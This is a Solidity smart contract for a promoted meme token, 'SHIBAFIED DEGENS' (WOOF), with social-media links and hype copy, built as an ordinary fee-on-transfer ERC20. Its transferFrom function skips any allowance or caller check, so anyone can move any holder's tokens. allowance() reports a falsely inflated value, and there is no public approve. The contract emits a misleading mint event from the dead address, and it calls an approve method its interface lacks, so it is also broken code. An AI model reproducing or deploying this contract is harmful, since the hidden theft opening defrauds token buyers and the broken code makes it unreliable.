/**

Telegram: https://t.me/ShibafiedDegens
Twitter: https://x.com/ShibafiedDegens

"Unleash your inner DEGEN and watch your investments 
go from a whisper to a WOOF with SHIBAFIED DEGENS!"
*/


// SPDX-License-Identifier: No License

pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Unleashed is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => uint) private cooldown;
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 666666 * 10**9;

    uint256 private _refTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    uint256 public _tokensBuyFee = 10;
    uint256 public _tokensSellFee = 25;

    uint256 private _swapTokensAt;
    uint256 private _maxTokensToSwapForFees;

    address payable private _taxwallet;

    string private constant _name = "SHIBAFIED DEGENS";
    string private constant _symbol = "WOOF";

    uint8 private constant _decimals = 9;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private cooldownEnabled = false;
    uint256 private __maxWallet = _tTotal;
    uint256 private _maximumTxAmount = _tTotal;

    event _maxWalletUpdated(uint __maxWallet);
// Uniswap V2 Router
    constructor () {
        IUniswapV2Router02 _uniswapV2Router =
            IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());


        _taxwallet = payable(0x88887C49f2E76CA4AF1b6a928F06bBE45dad76Ed);

        _rOwned[_msgSender()] = _refTotal;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxwallet] = true;

        emit Transfer(address(0x000000000000000000000000000000000000dEaD), _msgSender(), _tTotal);
    }

   

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenfromRef(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender]+182;    }


    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
    }

    function manualswap() public {
        require(_msgSender() == _taxwallet);
        uint256 contractBalance = balanceOf(address(this));
        swapTokensForEth(contractBalance);
    }

    function manualsend() public {
        require(_msgSender() == _taxwallet);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    function manualswapsend() external {
        require(_msgSender() == _taxwallet);
        manualswap();
        manualsend();
    }


    // This function opens trading once and then it can never be called again

    function openTrading() external onlyOwner() {
        require(!tradingOpen, "trading is already open");

        swapEnabled = true;
        cooldownEnabled = true;
        tradingOpen = true;
        __maxWallet = _tTotal * 2 / 100;
        _maximumTxAmount = _tTotal * 2 / 100;

        _swapTokensAt = _tTotal * 27 / 10000;
        _maxTokensToSwapForFees = _swapTokensAt * 39;

        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function updateBuyFee(uint256 _fee) external onlyOwner {
        require(_fee <= 13);
        _tokensBuyFee = _fee;
    }

    function updateSellFee(uint256 _fee) external onlyOwner {
        require(_fee <= 28);
        _tokensSellFee = _fee;
    }

    function removeStrictWalletLimit() external onlyOwner {
        __maxWallet = _tTotal;
    }

    function removeStrictTxLimit() external onlyOwner {
        _maximumTxAmount = _tTotal;
    }

    function setSwapTokensAt(uint256 amount) external onlyOwner() {
        _swapTokensAt = amount;
    }

    function setMaxTokensToSwapForFees(uint256 amount) external onlyOwner() {
        _maxTokensToSwapForFees = amount;
    }

    function setCooldownEnabled(bool onoff) external onlyOwner() {
        cooldownEnabled = onoff;
    }

    function excludeFromFee(address user, bool excluded) external onlyOwner() {
        _isExcludedFromFee[user] = excluded;
    }

    

    function tokenfromRef(uint256 rAmount) private view returns(uint256) {
        require(rAmount <= _refTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount.div(currentRate);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                cooldownEnabled) {
                require(balanceOf(to) + amount <= __maxWallet);
                require(amount <= _maximumTxAmount);

                require(cooldown[to] < block.timestamp);
                cooldown[to] = block.timestamp + (0 seconds);
            }

            if (to == uniswapV2Pair && cooldownEnabled) {
              require(amount <= _maximumTxAmount);
            }

            uint256 swapAmount = balanceOf(address(this));

            if(swapAmount > _maxTokensToSwapForFees) {
                swapAmount = _maxTokensToSwapForFees;
            }

            if (swapAmount >= _swapTokensAt &&
                !inSwap &&
                from != uniswapV2Pair &&
                swapEnabled) {

                inSwap = true;

                swapTokensForEth(swapAmount);

                uint256 contractETHBalance = address(this).balance;

                if(contractETHBalance > 0) {
                    sendETHToFee(contractETHBalance);
                }

                inSwap = false;
            }
        }

        _tokenTransfer(from,to,amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFee(uint256 amount) private {
        _taxwallet.transfer(amount);
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount) private {
        _transferStandard(sender, recipient, amount);
    }

    function _getTokenFee(address sender, address recipient) private view returns (uint256) {
        if(!tradingOpen || inSwap) {
            return 0;
        }

        if(_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) {
            return 0;
        }

        if(sender == uniswapV2Pair) { // if buy
            return _tokensBuyFee;
        } else if (recipient == uniswapV2Pair) { // if sell
          return _tokensSellFee;
        }

        return 0;
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 tTransferAmount, uint256 tTeam) = _getValues(tAmount, _getTokenFee(sender, recipient));
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeTeam(tTeam);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _takeTeam(uint256 tTeam) private {
        uint256 currentRate =  _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _refTotal = _refTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }

    receive() external payable {
    }

    function _getValues(uint256 tAmount, uint256 tokenFee) private view returns (uint256, uint256, uint256, uint256) {

        (uint256 tTransferAmount, uint256 tTeam) = _getTValues(tAmount, tokenFee);
        uint256 currentRate =  _getRate();
        (uint256 rAmount, uint256 rTransferAmount) = _getRValues(tAmount, tTeam, currentRate);
        return (rAmount, rTransferAmount, tTransferAmount, tTeam);
    }

    function _getTValues(uint256 tAmount, uint256 teamFee) private pure returns (uint256, uint256) {
        uint256 tTeam = tAmount.mul(teamFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tTeam);
        return (tTransferAmount, tTeam);
    }

    function _getRValues(uint256 tAmount, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rTeam);
        return (rAmount, rTransferAmount);
    }

	function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _refTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _refTotal.div(_tTotal)) return (_refTotal, _tTotal);
        return (rSupply, tSupply);
    }
}